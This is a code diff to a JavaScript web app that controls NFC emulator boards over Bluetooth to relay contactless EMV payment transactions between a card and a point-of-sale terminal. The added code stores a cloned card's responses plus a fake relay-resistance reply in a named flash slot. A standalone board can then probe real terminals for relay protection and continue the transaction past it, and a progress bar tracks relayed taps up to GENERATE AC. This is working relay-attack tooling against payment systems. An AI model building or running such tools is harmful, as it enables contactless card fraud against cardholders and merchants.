@@ -18,7 +18,7 @@
  */
 'use strict';
 
-const BUILD = '20260909 rssi+decode';   // shown in the log so you can confirm which version loaded
+const BUILD = '20260909 lure-slot+stepper';   // shown in the log so you can confirm which version loaded
 
 // --- Nordic UART Service (verified in firmware ble_main.c / ble_nus) ---------
 const NUS_SERVICE = '6e400001-b5a3-f393-e0a9-e50e24dcca9e';
@@ -34,6 +34,8 @@ const CMD = {
   SET_ACTIVE_SLOT: 1003,
   SET_SLOT_TAG_TYPE: 1004,
   SET_SLOT_ENABLE: 1006,
+  SET_SLOT_TAG_NICK: 1007,        // name a slot (persisted): [slot][sense][name bytes]
+  SLOT_DATA_CONFIG_SAVE: 1009,    // commit active slot's data+config to flash (empty payload)
   GET_GIT_VERSION: 1017,
   GET_BATTERY_INFO: 1025,   // -> [voltage_mV(2 BE)][percent(1)]
   HF14A_4_APDU_RECV: 6000,
@@ -365,6 +367,14 @@ class ChameleonBLE {
     const p = concat(u8([a.uid.length]), a.uid, a.atqa, u8([a.sak]), u8([a.ats.length]), a.ats);
     return this.sendCmd(CMD.HF14A_4_SET_ANTI_COLL, p);
   }
+  // Persist the active slot's data+config (incl. the flash-backed static-response
+  // table just loaded) to flash, so it survives a reboot and is usable standalone.
+  saveSlotToFlash() { return this.sendCmd(CMD.SLOT_DATA_CONFIG_SAVE, new Uint8Array(0), 6000); }
+  // Name a slot (persisted). name is truncated to 32 bytes.
+  setSlotNick(slot, sense, name) {
+    const nb = new TextEncoder().encode(name).slice(0, 32);
+    return this.sendCmd(CMD.SET_SLOT_TAG_NICK, concat(u8([slot - 1, sense]), nb));
+  }
   // Clear any static (cached) APDU responses on the active slot. The web app never
   // sets them, but they are flash-backed and persist, so a stray cache (e.g. from a
   // debug tool) would make the ghost answer from cache instead of relaying live.
@@ -588,6 +598,37 @@ function setLedUI(who, color) {
   if (dot) dot.dataset.color = color;
 }
 
+// Transaction progress stepper: lights up PPSE -> SELECT AID -> GPO -> READ
+// RECORD -> GENERATE AC as each command class is relayed during a tap.
+// Reaching GENERATE AC = the terminal accepted the card and is authorising, so
+// the whole bar goes green there. Reset per tap.
+const TX_STEP_COUNT = 5;
+function txStepShow(on) { const b = $('txsteps'); if (b) b.hidden = !on; }
+function txStepReset() {
+  const b = $('txsteps'); if (!b) return;
+  b.hidden = false;
+  [...b.children].forEach(el => { el.className = 'txstep'; });
+}
+function txStepMark(idx) {   // idx active; all before it done; GENERATE AC (last) = all done
+  const b = $('txsteps'); if (!b || idx < 0) return;
+  b.hidden = false;
+  const last = idx === TX_STEP_COUNT - 1;
+  [...b.children].forEach((el, i) => {
+    const done = i < idx || last;
+    el.className = 'txstep' + (done ? ' done' : i === idx ? ' active' : '');
+  });
+}
+function txStepFor(apdu) {   // map a reader APDU to a step index, or -1
+  if (!apdu || apdu.length < 2) return -1;
+  const a0 = apdu[0], a1 = apdu[1];
+  if (a0 === 0x00 && a1 === 0xA4)             // SELECT: PPSE if the name field starts 32 50 ("2P")
+    return (apdu.length > 6 && apdu[5] === 0x32 && apdu[6] === 0x50) ? 0 : 1;
+  if (a0 === 0x80 && a1 === 0xA8) return 2;   // GPO
+  if (a0 === 0x00 && a1 === 0xB2) return 3;   // READ RECORD
+  if (a0 === 0x80 && a1 === 0xAE) return 4;   // GENERATE AC
+  return -1;
+}
+
 function setDevUI(who, dev) {
   const el = $(who + '-status');
   if (!dev.connected) { el.textContent = 'not connected'; }
@@ -751,6 +792,7 @@ async function startRelay() {
   if (role === 'ghost' && !wsLink.connected) { log('not connected to the relay server', 'err'); return; }
   running = true; apduCount = 0; rrpSeenThisRun = false; rrpResolved = false; setRrpBadge('watch');
   curPdol = null; curCdol1 = null; curTermData = {}; recognisedThisRun = false;
+  txStepReset();   // show the empty transaction progress bar, ready for the first tap
   acquireWakeLock();
   updateStartEnabled();
   // (Mode B / card-presence gating was removed: its idle ATQA probe misfired
@@ -891,8 +933,13 @@ async function startRelay() {
         apduCount = 0;
         curPdol = null; curCdol1 = null;   // DOL layouts are per-card/per-tap
         if (!rrpSeenThisRun) rrpResolved = false;  // re-watch RRP for the new tap
+        txStepReset();                     // fresh progress bar for the new tap
       }
       sawIdle = false;
+      // Progress bar: PPSE (step 0) starts a fresh transaction, then each command
+      // class advances it. Resetting on PPSE makes it per-transaction, so several
+      // taps in one relay session each get their own clean run.
+      { const st = txStepFor(apdu); if (st === 0) txStepReset(); if (st >= 0) txStepMark(st); }
       // Terminal RRP enforcement: EXCHANGE RELAY RESISTANCE DATA (80 EA). If the
       // reader sends this, it is time-checking the relay (distance bounding).
       if (apdu.length >= 2 && apdu[0] === 0x80 && apdu[1] === 0xEA) {
@@ -1105,6 +1152,7 @@ async function moleServeClone() {
 
 function stopRelay() {
   running = false;
+  txStepShow(false);   // hide the transaction progress bar
   // Reader-RRP verdict for the session just ended (only meaningful if you relayed an
   // RRP-ADVERTISING card, e.g. the Mastercard — a card that doesn't advertise RRP will
   // never make the reader send 80 EA).
@@ -1591,6 +1639,52 @@ async function buildRrpLure() {
   log(`RRP lure built (${lure.pairs.length} responses; GPO AIP advertises RRP) and saved. Now click "RRP POS test" and tap on the POS.`, 'ok');
 }
 
+// Persist the RRP lure into a DEDICATED SLOT's flash so it survives a reboot /
+// localStorage clear and can be used standalone: switch the board to the slot
+// with its button and tap a POS. Bakes in an 80 EA answer + a READ RECORD
+// fallback so the emulated card is self-sufficient with no host attached; the
+// standalone-verdict firmware then flashes RED (POS uses RRP) / GREEN (it does
+// not) on the tap. Builds the lure from your card first if none is saved yet.
+async function saveLureToSlot() {
+  if (running || rrpTestRunning || sniffRunning) { log('stop the current session first', 'warn'); return; }
+  const dev = mole.connected ? mole : (ghost.connected ? ghost : null);
+  if (!dev) { log('connect a board first', 'err'); return; }
+  const slot = parseInt($('lure-slot').value, 10) || 8;
+  let lure = loadRrpLure();
+  if (!lure) {
+    log(`no saved lure — reading your card on the ${dev.label} to build one first…`, 'warn');
+    await dev.changeMode(true);
+    for (let i = 0; i < 40 && !lure; i++) {
+      try { if ((await dev.cardProbe(true)).status === ST.HF_TAG_OK) lure = await captureRrpLure(dev); } catch (_) {}
+      if (!lure) await sleep(300);
+    }
+    if (!lure) { log('could not read a card to build the lure', 'err'); return; }
+    saveRrpLure(lure);
+  }
+  // captured PPSE/SELECT/GPO + standalone self-sufficiency answers. cmd is a
+  // PREFIX (firmware matches apdu_len>=cmd_len && memcmp), so 2-byte cmds catch
+  // any EXCHANGE RRP / READ RECORD regardless of their trailing data.
+  const pairs = lure.pairs.slice();
+  pairs.push({ cmd: hexToBytes('80EA'), resp: hexToBytes('000000000001000200019000') }); // any 80 EA -> dummy RRP ok
+  pairs.push({ cmd: hexToBytes('00B2'), resp: hexToBytes('6A83') });                       // any READ RECORD -> not found
+  if (pairs.length > 12) log(`warning: ${pairs.length} responses exceed the 12 flash slots — extras go to RAM and won't persist standalone`, 'warn');
+  try {
+    log(`saving RRP lure to slot ${slot} — persisting to flash…`, 'warn');
+    await dev.setActiveSlot(slot);
+    await dev.setSlotTagType(slot, TAG_HF14A_4);
+    await dev.setSlotEnable(slot, SENSE_HF, true);
+    await dev.clearStaticResponses();
+    await dev.setAntiColl(lure.anti);
+    const n = await dev.addStaticResponseBatch(pairs);
+    await dev.saveSlotToFlash();
+    try { await dev.setSlotNick(slot, SENSE_HF, 'RRP-LURE'); } catch (_) {}
+    await dev.changeMode(false);   // leave it emulating on that slot, ready to tap
+    log(`✓ RRP lure saved to slot ${slot} (${n} responses persisted, named "RRP-LURE"). It survives reboot and localStorage clears. Standalone use: switch the board to slot ${slot} with its button and tap a POS — with the standalone-verdict firmware, RED LED = POS uses RRP, GREEN = it does not.`, 'ok');
+  } catch (e) {
+    log('save lure to slot failed: ' + e, 'err');
+  }
+}
+
 // RRP POS test: arm the GHOST with the saved lure and watch for 80 EA (ghost-only).
 async function rrpPosTest() {
   if (rrpTestRunning) { rrpTestRunning = false; log('stopping RRP POS test…', 'warn'); return; }
@@ -1599,8 +1693,8 @@ async function rrpPosTest() {
   if (!dev) { log('connect a board first (the one you tap on the POS)', 'err'); return; }
   const lure = loadRrpLure();
   if (!lure) { log('no saved lure — put your card on a connected board and click "Build RRP lure" first', 'err'); return; }
-  const slot = parseInt($('slot').value, 10) || 1;
-  log(`RRP POS test: using saved lure (${lure.pairs.length} responses).`, 'ok');
+  const slot = parseInt($('lure-slot').value, 10) || parseInt($('slot').value, 10) || 8;
+  log(`RRP POS test: using saved lure (${lure.pairs.length} responses) on slot ${slot}.`, 'ok');
 
   rrpTestRunning = true;
   if ($('rrptest-btn')) $('rrptest-btn').textContent = 'Stop RRP test';
@@ -1608,7 +1702,7 @@ async function rrpPosTest() {
   log(`=== RRP POS TEST armed: the ${dev.label} is emulating an RRP-advertising card. TAP IT ON THE POS. ===`, 'ok');
   try {
     await armGhost(lure.anti, slot, lure.pairs, dev);
-    dev.setLed(1).catch(() => {});
+    dev.setLed(6).catch(() => {}); setLedUI(dev.label, 'blue');   // blue: armed, waiting for the tap
     const EMPTY = new Uint8Array(0);
     let pending = EMPTY, verdict = null, idle = 0, sessionStored = false;
     const storeVerdict = (rrpState) => {
@@ -1621,7 +1715,8 @@ async function rrpPosTest() {
       let r; try { r = await dev.apduSendRecv(pending, 600); } catch (_) { pending = EMPTY; continue; }
       pending = EMPTY;
       if (r.status !== ST.SUCCESS) {           // no APDU this window
-        if (verdict && ++idle > 3) { log('— tap ended; tap again to re-test, or Stop —', 'ok'); verdict = null; idle = 0; setRrpBadge('watch'); }
+        if (verdict && ++idle > 3) { log('— tap ended; tap again to re-test, or Stop —', 'ok'); verdict = null; idle = 0; setRrpBadge('watch');
+          dev.setLed(6).catch(() => {}); setLedUI(dev.label, 'blue'); }   // re-arm blue for the next tap
         continue;
       }
       idle = 0;
@@ -1629,9 +1724,11 @@ async function rrpPosTest() {
       if (apdu.length >= 2 && apdu[0] === 0x80 && apdu[1] === 0xEA) {
         if (verdict !== 'rrp') { log('✓✓ POS SENT 80 EA (EXCHANGE RELAY RESISTANCE DATA) — THIS POS USES RRP', 'warn'); storeVerdict('enforced'); }
         setRrpBadge('enforced'); verdict = 'rrp';
+        dev.setLed(7).catch(() => {}); setLedUI(dev.label, 'red');   // red: POS uses RRP
         pending = hexToBytes('000000000001000200019000');   // dummy RRP response so the POS proceeds
       } else if (apdu.length >= 2 && apdu[0] === 0x00 && apdu[1] === 0xB2) {
-        if (!verdict) { log('POS went to READ RECORD after GPO with NO 80 EA — THIS POS does NOT use RRP', 'ok'); setRrpBadge('clear'); verdict = 'norrp'; storeVerdict('no-ea'); }
+        if (!verdict) { log('POS went to READ RECORD after GPO with NO 80 EA — THIS POS does NOT use RRP', 'ok'); setRrpBadge('clear'); verdict = 'norrp'; storeVerdict('no-ea');
+          dev.setLed(8).catch(() => {}); setLedUI(dev.label, 'green'); }   // green: no RRP
         pending = hexToBytes('6A83');
       } else {
         // After a verdict the reader often brute-forces its whole AID list (our
@@ -1930,6 +2027,7 @@ window.addEventListener('DOMContentLoaded', () => {
   $('clearcache-btn').onclick = clearCache;
   if ($('rrp-btn')) $('rrp-btn').onclick = checkRRP;
   if ($('lure-btn')) $('lure-btn').onclick = buildRrpLure;
+  if ($('lure-save-btn')) $('lure-save-btn').onclick = saveLureToSlot;
   if ($('rrptest-btn')) $('rrptest-btn').onclick = rrpPosTest;
   if ($('sniff-btn')) $('sniff-btn').onclick = passiveSniff;
   if ($('genac-btn')) $('genac-btn').onclick = testPayment;
